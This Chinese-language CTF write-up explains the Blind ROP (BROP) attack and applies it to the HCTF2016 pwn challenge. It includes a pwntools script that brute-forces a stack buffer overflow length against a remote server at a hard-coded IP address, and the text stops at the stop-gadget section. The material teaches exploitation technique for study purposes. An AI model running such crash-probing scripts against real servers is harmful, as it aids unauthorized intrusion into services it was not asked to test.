# BROP

+++

>参考链接
>
>[BROP](https://wooyun.js.org/drops/Blind%20Return%20Oriented%20Programming%20(BROP)%20Attack%20-%20%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86.html)
>
>[CTF-All-In-One/6.1.1_pwn_hctf2016_brop.md at master · Cherishao/CTF-All-In-One · GitHub](https://github.com/Cherishao/CTF-All-In-One/blob/master/doc/6.1.1_pwn_hctf2016_brop.md)
>
>[使用阿里云服务器搭建一道BROP的pwn题](https://blog.csdn.net/acsuccess/article/details/104513555)

+++

### 基本介绍

BROP(Blind ROP) 于 2014 年由 Standford 的 Andrea Bittau 提出，其相关研究成果发表在 Oakland 2014，其论文题目是 **Hacking Blind**，下面是作者对应的 paper 和 slides, 以及作者相应的介绍

- [paper](http://www.scs.stanford.edu/brop/bittau-brop.pdf)
- [slide](http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf)

BROP 是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。



### 基本原理

目标：通过ROP的方法远程攻击某个应用程序，劫持该应用程序的控制流。我们可以不需要知道该应用程序的源代码或者任何二进制代码，该应用程序可以被现有的一些保护机制如NX, ASLR, PIE, 以及stack canaries等保护，应用程序所在的服务器可以是32位系统或者64位系统。

初看这个目标感觉实现起来特别困难。其实这个攻击有两个前提条件的：

- 必须先存在一个已知的stack overflow的漏洞，而且攻击者知道如何触发这个漏洞；
- 服务器进程在crash之后会重新复活，并且复活的进程不会被re-rand（意味着虽然有ASLR的保护，但是复活的进程和之前的进程的地址随机化是一样的）。这个需求其实是合理的，因为当前像nginx, MySQL, Apache, OpenSSH, Samba等服务器应用都是符合这种特性的。





### 例题

这里我们以 [HCTF2016 的出题人失踪了](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop) 为例。基本思路如下



### 确定栈溢出

首先我们要确定该程序是否具有**栈溢出 **，以及溢出长度，和是否具有 Canary 保护等信息，方式是 通过暴力输入 根据反馈 来判断

#### 测试程序

首先，`nc`连接程序，正常输入查看程序状态 

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-06-06_19-36-57.png)

上图中，nc连接后，首先会给一个正常的提示符 "WelCome my frined,Do you know password?" ，然后进行输入，输入正常时会给一定的回显，即字符串"No password,no game" ,然后程序崩溃，呈现一直等待输入状态。==当我们重启程序，尝试输入明显过长的字符串时，可以看到程序无回显，直接崩溃，所以可以推断该程序具有*栈溢出漏洞*==，又因为无特定的关于Canary的提示信息，因此可知该程序**并没有开启Canary保护**。与下图对比查看，下图展示了具有Canary保护时，发生栈溢出的情况

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-06-06_19-52-10.png)

**由此可知，该程序具有栈溢出漏洞满足了第一个条件，同时该程序无Canary保护，相对简单**

#### 获取缓存区长度

```python
# Testing stack overflow size ,bruteforce 
from pwn import *
def get_buffer_size():
    cnt = 1
    while 1:
        try:
            p = remote('39.108.221.138',10001)   #远程连接
            p.recvuntil(b"WelCome my frined,Do you know password?\n")  #输入提示信息
            p.send(cnt*b'A')   #发送尝试字符串
            p.recv()    #当 发生溢出时，recv()接受为空，socket()读到末尾，发生EOFError 
            p.close()
            log.info("bad: %d" % (cnt-1))
            cnt +=1
        except EOFError:
            p.close()			
            log.info("buffer size: %d" % (cnt-1))    #当溢出发生时，说明输入长度已超过缓冲区长度，因此要减一
            return cnt-1

buffer_size = get_buffer_size()
print("Buffer size is [%d]" %buffer_size)  #Buffer size is [72]
```

**由此可得，缓冲区长度为72**



### 查找gadget



#### Stop gadget

​		在查找通用gadget前我们需要找到一个`stop gadget`。一般情况下，但我们把返回地址覆盖时，程序会崩溃；所以我们需要找到一个能让程序正常返回的`gadget`，这一步很重要。`stop gadget`可能不止一个，我们只需要找到第一个即可。
